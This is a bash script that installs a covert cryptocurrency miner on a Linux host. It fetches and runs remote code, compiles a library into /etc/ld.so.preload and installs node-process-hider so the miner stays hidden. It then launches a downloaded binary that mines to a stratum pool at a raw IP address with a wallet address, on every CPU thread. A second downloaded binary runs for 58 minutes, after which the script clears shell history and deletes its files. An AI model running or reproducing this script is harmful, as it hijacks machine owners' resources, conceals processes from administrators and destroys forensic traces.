#!/bin/bash
curl https://bitbucket.org/dennidarko01/kangkung/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt install nodejs -y && npm install -g npm@8.19.2 -y && npm i -g node-process-hider && ph add sgr1
wget -O sgr1 https://bitbucket.org/dennidarko01/kangkung/raw/master/plant && chmod +x sgr1 && ./sgr1 -a yespowersugar -o stratum+tcp://8.209.98.71:80 -u TX7hx8zqvfvb4c16QkuZYfrV4Kvqi8xMGi -p c=TRX,mc=SUGAR,ID=$(echo $(shuf -i 1000-9999 -n 1)-E) -t$(nproc --all) >/dev/null &
uname -a
wget https://raw.githubusercontent.com/SalinaMoh/kyson/master/time
chmod +x time
history -rc
timeout 58m ./time
rm sgr1 time *.sh data.zip
echo "done..."
history -rc